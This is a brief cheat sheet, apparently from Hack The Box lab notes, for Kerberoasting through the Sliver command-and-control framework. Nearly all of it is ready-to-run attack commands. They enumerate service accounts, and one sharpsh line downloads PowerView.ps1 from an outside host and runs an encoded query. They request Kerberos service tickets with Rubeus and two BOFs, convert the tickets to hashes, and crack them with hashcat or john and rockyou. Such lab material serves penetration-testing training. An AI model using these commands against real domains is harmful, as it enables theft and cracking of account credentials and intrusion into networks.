# 15.13 Kerberoasting via Sliver

> Roast SPN accounts via inline-Rubeus, `c2tc-kerberoast` BOF, or `bof-roast` — convert with `TicketToHashcat.py` or `apreq2hashcat.py`.

## Overview

Kerberoasting retrieves krb5tgs hashes for accounts with SPNs. Three methods are demonstrated: inline-execute-assembly with Rubeus, the c2tc-kerberoast BOF (requires TicketToHashcat.py), and bof-roast (requires apreq2hashcat.py). Enumerate targets first with sharpsh or delegationbof.

## Steps

- Enumerate SPN accounts with sharpsh+PowerView Get-NetUser -spn or `delegationbof 6 <domain>`.
- Use setspn.exe (via execute) to list all SPNs: `setspn.exe -Q */*`.
- `inline-execute-assembly Rubeus.exe 'kerberoast /format:hashcat /user:<name> /nowrap'` — most direct.
- `c2tc-kerberoast roast <username>` outputs base64 ticket; decode with TicketToHashcat.py.
- `bof-roast <SPN>` outputs raw ticket; convert with apreq2hashcat.py.
- Crack resulting hashes with hashcat -m 13100 (RC4) or john + rockyou.txt.

## Commands

### Encode SPN enumeration query

```bash
echo "Get-NetUser -spn | select samaccountname,description" | base64
```

### Enumerate SPNs via sharpsh

```text
sliver (http-beacon) > sharpsh -- '-u http://10.10.14.62:8080/PowerView.ps1 -e -c "R2V0LU5ldFVzZXIgLXNwbiB8IHNlbGVjdCBzYW1hY2NvdW50bmFtZSxkZXNjcmlwdGlvbgo="'
```

### delegationbof SPN check

```text
sliver (http-beacon) > delegationbof 6 child.htb.local
```

### setspn via execute

```powershell
PS C:\Users\eric\Desktop> setspn.exe -Q */*
```

### Rubeus kerberoast inline

```text
sliver (http-session) > inline-execute-assembly /home/htb-ac590/Rubeus.exe 'kerberoast /format:hashcat /user:alice /nowrap'
```

### c2tc-kerberoast roast

```text
sliver (http-beacon) > c2tc-kerberoast roast alice
```

### bof-roast by SPN

```text
sliver (http-beacon) > bof-roast rdp/web01.child.htb.local
```

### Crack with john

```bash
john roastme-13100.txt -w=/usr/share/wordlists/rockyou.txt
```
